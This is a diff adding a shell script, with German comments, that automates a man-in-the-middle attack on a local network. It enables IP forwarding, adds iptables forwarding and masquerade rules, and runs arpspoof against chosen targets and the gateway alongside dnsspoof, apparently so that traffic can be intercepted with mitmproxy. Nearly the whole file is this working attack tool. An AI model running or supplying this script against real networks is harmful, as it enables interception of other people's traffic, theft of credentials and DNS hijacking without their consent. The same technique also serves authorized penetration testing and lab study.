@@ -1,0 +1,128 @@
+#!/usr/bin/env sh
+
+#set -x
+set -e
+
+export LANG="C"
+export PATH="/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin"
+
+test -r config \
+	&& source config
+
+usage () {
+	cat <<! 1>&2
+Usage: $0 <start|stop|status> ;-)
+!
+	exit 1
+}
+startup () {
+	local t_r="$@"
+
+	sysctl -w net.ipv4.conf.$if.forwarding=1
+
+	iptables -I FORWARD -j ACCEPT
+	iptables -t nat -I POSTROUTING -o $if -j MASQUERADE
+
+	daemonize -e $log -o $log -c $dir -l $dnsspoof_pid -p $dnsspoof_pid -u root /usr/sbin/dnsspoof -i $if host $gw
+	daemonize -e $log -o $log -c $dir -l $arpspoof_pid -p $arpspoof_pid -u root /usr/sbin/arpspoof -i $if $t_r $gw	
+}
+cleanup () {
+	pkill -F $arpspoof_pid
+	pkill -F $dnsspoof_pid
+	iptables -D FORWARD 1
+	iptables -t nat -D POSTROUTING 1
+	sysctl -w net.ipv4.conf.$if.forwarding=0
+}
+status () {
+	tail $log
+}
+
+cd ~/.mitmproxy/ || exit
+
+dir="/tmp/`basename "$0"`"
+mkdir -p $dir && cd $dir
+pwd
+
+arpspoof_pid="arpspoof.pid"
+dnsspoof_pid="dnsspoof.pid"
+log="`basename "$0"`.log"
+
+# check write permissions amongst other things
+touch $dir $arpspoof_pid $dnsspoof_pid $log
+
+# Interface und entsprechendes Gateway
+con=${CONNECTION:-`nmcli -g uuid,state connection | awk -F ':' '$2=="activated" {print $1; exit}'`}
+if=${if:-`nmcli -t connection show $con | sed -n -E "/^GENERAL\.DEVICES:/s///p"`}
+gw=${gw:-`nmcli -t connection show $con | sed -n -E "/^IP4\.GATEWAY:/s///p"`}
+
+TEMP=$(getopt -o 'hi:g:' --long 'help,interface:,gateway:' -n "$0" -- "$@")
+
+if [ $? -ne 0 ]; then
+	usage
+	echo 'Terminating...' >&2
+	exit 1
+fi
+
+# Note the quotes around "$TEMP": they are essential!
+eval set -- "$TEMP"
+unset TEMP
+
+while true; do
+	case "$1" in
+		'-h'|'--help')
+			echo 'Option -h, --help'
+			shift 1
+			usage
+			exit
+		;;
+		'-i'|'--interface')
+			echo "Option -i, --interface; argument '$2'"
+			if="$2"
+			shift 2
+			continue
+		;;
+		'-g'|'--gateway')
+			echo "Option -g, --gateway; argument '$2'"
+			gw="$2"
+			shift 2
+			continue
+		;;
+		'--')
+			shift
+			break
+		;;
+		*)
+			echo 'Internal error!' >&2
+			exit 1
+		;;
+	esac
+done
+
+echo 'Remaining arguments:'
+for arg; do
+	echo "--> '$arg'"
+done
+
+if [ ! "$if" ] || [ ! "$gw" ]; then
+	echo "Konnte Interface/Gateway nicht ermitteln :-(" 1>&2
+	exit 1
+else
+	echo "Interface ($if)/Gateway ($gw) ermittelt :-)"
+fi
+
+case "$1" in
+	start)
+		shift
+		startup "$@"
+	;;
+	stop)
+		cleanup
+	;;
+	status)
+		status
+	;;
+	*)
+		usage
+	;;
+esac
+
